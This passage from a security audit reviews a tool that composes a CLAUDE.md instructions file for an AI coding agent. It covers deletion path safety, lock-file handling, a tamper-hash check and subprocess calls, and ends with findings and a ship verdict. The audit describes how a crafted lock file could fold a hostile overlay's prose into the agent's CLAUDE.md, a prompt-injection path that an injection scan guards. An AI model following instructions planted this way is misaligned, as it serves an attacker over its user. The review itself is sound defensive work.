  `.claude/agents` and **kebab-validated** overlay/agent names (lines 1215, 1233). The lock's
  `source_path`/`local_path` strings are **never** used to build a deletion target. The
  last-overlay cleanup removes only `project_path/CLAUDE.md`, `project_path/spec/overlay-manifest.lock`,
  the kebab-derived `artifacts_to_remove`, and `rmdir` of the empty `project_path/.system2/overlays`
  (lines 1881-2012). **No path escapes `project_path`.** This is byte-identical to the frozen
  oracle's `_uninstall`/`_compute_stale_artifacts` (`composer.py.preflip:2034-2083, 2294+`) — parity,
  no regression.
- **Attempt B (read/compose from a hostile `source_path[]`).** `from-lock`
  (`cli.py:278-298 _resolve_overlay_paths`) and the multi-overlay `uninstall` recompose
  (`claude_code.py:1782-1794`) read `overlays[].source_path` verbatim from the lock and pass
  them to `ir.compose`. These are arbitrary absolute paths: a lock can name an out-of-project
  overlay directory and the compiler will *read* and *compose* it. This is **identical to the
  frozen oracle** (`composer.py.preflip` resolves `source_path` the same way) and is the
  intended `--from-lock` contract (the lock records where overlays came from). Containment is
  enforced on the **write** side, not the read side: `emit` (`claude_code.py:1497-1506`) refuses
  when `project_path` is inside any overlay source (defense-in-depth against writing into an
  overlay tree). So a hostile lock can cause the compiler to *read* an attacker-chosen directory
  and fold a hostile overlay's prose into the composed `CLAUDE.md` — but that is the same overlay
  trust model already covered by the front-end injection scan (`_scan_for_injection`), and it
  cannot read outside the running user's own filesystem permissions, nor write outside
  `project_path`. No *new* exposure vs. supplying the same overlay via `--overlays`.
- **Attempt C (malformed lock → crash/partial-delete).** Malformed JSON, non-list `overlays`,
  missing `name`, empty `source_path` are each caught with the oracle's exact refusal
  (`claude_code.py:1735-1788`) before any mutation; the last-overlay write path is wrapped in a
  backup/restore try/except (lines 1909-1989) that rolls back `CLAUDE.md` and removed dirs on any
  failure. No partial-destruction primitive found.

**Verdict (b) — lifecycle-on-untrusted-lock path safety: SAFE / contained.** Deletion targets
are rooted at `project_path` via kebab-validated names only; lock `source_path[]` reads match the
frozen oracle and the existing overlay trust model (no new read-outside-project escalation beyond
the user's own permissions; no write/delete outside `project_path`).

### Threat 3 — `doctor` + the drift/tamper guard

- **`_freshness.py` hash confusion / TOCTOU.** The tamper check recomputes a sha256 over the
  sorted `(relpath, bytes)` of the fixed member set `("ir","backends","plugin_adapter.py","cli.py")`,
  excluding `__pycache__`/`*.pyc` and `BUNDLE.json` itself (lines 45-49, 84-98), and compares to
  the recorded `compiler_source_sha256`. The relpath is length-delimited by `\0` framing
  (lines 93, 97), so two different trees cannot collide via concatenation ambiguity. It is
  **report-only** (never gates compose), runs with no compiler source present, and treats an
  unreadable `BUNDLE.json` as tampered (lines 127-132). A TOCTOU window exists in principle
  (hash read vs. later import), but the check is advisory provenance, not an enforcement gate, so
  there is no security decision to race. Verified live in a hermetic `HOME`: `tampered=False`,
  recomputed == recorded (`514af38b…`). No hash confusion.
- **Does `doctor` execute project content?** For claude-code (the live plugin's pinned target)
  `doctor` is pure read-only drift comparison (`_drift_check`, `claude_code.py:1244+`) — it reads
  the lock, hashes files, reads the first line of `CLAUDE.md`; **no execution.**
- **goose / pi `doctor` shell-outs (compiler CLI only).** `goose recipe validate` (goose.py:1127)
  and the Pi node load harness (pi.py:1589) run as **list-argv** subprocesses (no `shell=True`),
  under a hermetic temp `HOME`/`XDG_CONFIG_HOME` that is `rmtree`'d after (goose.py:725-738,
  pi.py:1137+). The validated paths are fixed-named artifacts under `project_path`
  (`system2.recipe.yaml`, `agents/*.recipe.yaml`) and `project_path` is `os.path.abspath`'d
  upstream, so no leading-`-` argument-injection is constructible into the fixed `validate`/harness
  positionals. The Pi harness passes `projectRoot` as `process.argv[3]` **data** and loads the
  *emitted* `system2.ts` (plugin-generated, not arbitrary project content) via Pi's own
  `discoverAndLoadExtensions`; `import(PKG)` resolves the Pi package from npm root / `PI_PKG_ENTRY`,
  not from project data. No injection via project path or artifacts. **These shell-outs are
  unreachable from the live plugin anyway** — `plugin_adapter._TARGET` is hard-pinned to
  `"claude-code"` (plugin_adapter.py:45), so the plugin never instantiates the goose/pi backends.

### Threat 4 — Regression of prior-phase safety

- **Claude byte-identity / lifecycle parity.** `test_bundle_equivalence.py` and
  `test_plugin_evals_on_bundle.py` pass (4 passed, 17 subtests) in a hermetic `HOME` — the bundle
  reproduces the frozen preflip engine byte-for-byte and the plugin's own eval suite is green on
  the bundle. The ported `uninstall`/`drift_check`/`_compute_stale_artifacts` are byte-faithful to
  `composer.py.preflip`.
- **Pi native gate.** `test_pi_proven_blocking.py` did not regress: its 15 cases LOUD-skip
  (Pi binary unresolvable in this hermetic env) — by design a LOUD skip, not a silent pass — so the
  prior Phase-4 blocking properties are neither weakened nor masked by Phase 5. The Phase-4
  findings F-P1/F-P2/F-P3 remain the standing blockers from that phase (out of Phase 5 scope; this
  flip did not touch the Pi matcher logic).
- **Goose advisory posture.** Unchanged; `goose recipe validate` shell-out is the same hermetic,
  list-argv, advisory check.

No Phase 0–4 safety property was weakened by the flip or the new lifecycle.

### Phase 5 findings

| ID | Severity | Evidence | Remediation |
|----|----------|----------|-------------|
| F-P5-1 | **Low (accepted, parity)** | `from-lock`/multi-`uninstall` read `overlays[].source_path` verbatim and compose them (`cli.py:278-298`, `claude_code.py:1782-1794`); a crafted lock can point at an out-of-project overlay dir and fold its prose into `CLAUDE.md`. | None required for ship — identical to the frozen oracle and to supplying the overlay via `--overlays`; the front-end `_scan_for_injection` is the standing control. Optionally, surface a `doctor` note when a lock `source_path` resolves outside the project root. |
| F-P5-2 | **Info** | `_freshness` tamper check is report-only and has an advisory TOCTOU window (hash vs. import). | Acceptable: it is provenance, not an enforcement gate. The cross-repo staleness gate (`tools/check_bundle_fresh.py`) is the CI enforcement half. |
| F-P5-3 | **Info** | `SYSTEM2_USE_BUNDLE=0` escape hatch lets an operator silently run the frozen preflip engine instead of the bundle. | Intended A/B affordance; both engines are trusted on-disk code. Consider logging which engine ran when the escape hatch is set, for forensic clarity. |

No High/Medium findings introduced by Phase 5.

### Required fixes before ship (Phase 5)

- **None.** Phase 5 introduces **no ship blocker.** (Owner if F-P5-1's optional `doctor`
  out-of-project-source note is desired: **executor**.) The pre-existing Phase-4 blockers
  (F-P1/F-P2/F-P3) are unchanged and remain governed by that phase's gate, not this one.

### Defense-in-depth recommendations (Phase 5)

- Have the plugin surface the `_freshness` tamper verdict prominently in `doctor` output (it
  already does) and consider a CI assertion that `BUNDLE.json.compiler_source_sha256` matches the
  committed vendored subtree on every plugin release.
- Add an advisory `doctor` finding when any lock `source_path` resolves outside `project_path`
  (informational, not blocking) to make F-P5-1 visible to operators.
- Emit a one-line stderr notice when `SYSTEM2_USE_BUNDLE=0` is honored (F-P5-3).

### Residual risk + monitoring plan (Phase 5)

- **Residual: hostile overlay via lock `source_path` (F-P5-1).** Confidentiality/integrity bounded
  by the running user's own filesystem permissions and by write-containment to `project_path`;
  prose-injection bounded by `_scan_for_injection`. *Monitor:* keep the injection scan covering the
  fields composed into `CLAUDE.md`.
- **Residual: vendored-bundle tamper between releases.** Mitigated by the report-only
  `_freshness` check on device and the CI staleness gate. *Monitor:* fail the plugin build if the
  tamper check reports `tampered` or the staleness gate diverges.
- **Carried Phase-4 residual: Pi native-gate matcher defects (F-P1/F-P2/F-P3).** Unchanged by
  Phase 5; still the standing Phase-4 blockers.

**Explicit verdicts.**
**(a) Flip/shim safety — SAFE.** No `exec`/`eval` of attacker content (only the frozen
`composer.py.preflip` body, from a `__file__`-derived path); the `SYSTEM2_USE_BUNDLE` switch is a
binary A/B between two trusted on-disk engines, not an arbitrary-code loader; no stdlib-shadowing
`sys.path` insert.
**(b) Lifecycle-on-untrusted-lock path safety — SAFE / contained.** All deletion targets are rooted
at `project_path` via anchored kebab-validated names only; lock `source_path[]` reads match the
frozen oracle with no new read-outside-project escalation and no write/delete outside `project_path`.
**(c) Zero-dep + backout integrity — HOLD.** Bundle is stdlib-only (no third-party imports); shim
adds only `os`/`sys`; `composer.py.preflip` is intact and is the live module body, so the one-commit
backout restores the frozen engine with zero residue.
**Ship blocker (Phase 5): NO.** Phase 5 introduces no new blocker and weakens no Phase 0–4 safety
property. (The pre-existing Phase-4 F-P1/F-P2/F-P3 remain governed by Phase 4's gate.)
